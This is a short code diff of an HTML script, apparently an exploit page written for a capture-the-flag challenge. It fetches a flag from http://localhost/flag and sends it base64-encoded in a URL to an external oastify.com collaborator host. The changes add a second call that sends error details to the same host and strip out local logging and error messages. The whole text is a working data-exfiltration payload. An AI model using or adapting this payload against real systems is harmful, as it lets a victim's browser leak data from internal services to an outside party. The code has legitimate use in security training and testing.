@@ -9,19 +9,18 @@ setTimeout(() => {
     fetch('http://localhost/flag')
         .then(r => r.text())
         .then(flag => {
-            // Submit flag to the specified endpoint
+            // Submit successful response
             fetch('http://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?flag=' + btoa(flag))
                 .then(() => {
                     document.body.innerHTML = '<h1>Flag submitted successfully!</h1>';
-                    console.log('Flag submitted:', flag);
-                })
-                .catch(err => {
-                    document.body.innerHTML = '<h1>Error submitting flag:</h1><p>' + err.message + '</p>';
                 });
         })
         .catch(err => {
-            document.body.innerHTML = '<h1>Error fetching flag:</h1><p>' + err.message + '</p>';
-            console.error('Error fetching flag:', err);
+            // Submit error response
+            fetch('http://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error=' + btoa(err.toString()))
+                .then(() => {
+                    document.body.innerHTML = '<h1>Error submitted!</h1>';
+                });
         });
 }, 2000);
 </script>
